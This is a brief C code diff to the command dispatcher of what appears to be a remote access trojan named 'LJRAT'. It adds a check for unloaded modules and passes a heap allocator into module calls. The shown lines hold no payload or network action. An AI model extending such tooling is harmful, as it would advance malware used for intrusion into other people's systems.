@@ -47,9 +47,18 @@ static ERROR_T ProcessWork(PMESSAGE pMsg)
 
     pFunc = session_ctx.pFuncArray[pMsg->hdr.dwCommand];
 
+    if (NULL == pFunc)
+    {
+        DBG_PRINT("Module not loaded\n");
+        goto end;
+    }
+    
+
     DBG_PRINT("Len: %d CMD_TYPE: %d JOB_ID: %d\n", pMsg->hdr.dwMessageSize, pMsg->hdr.dwCommand, pMsg->hdr.dwJobID);
 
-    
+    // Passing LJRAT CRT functions into modules that implemented their own CRT so things don't blow up
+    pMsg->pHeapAlloc = HeapAlloc;
+
     iError = pFunc(pMsg, &pResult);
 
     // TODO Do something when a critical error happens
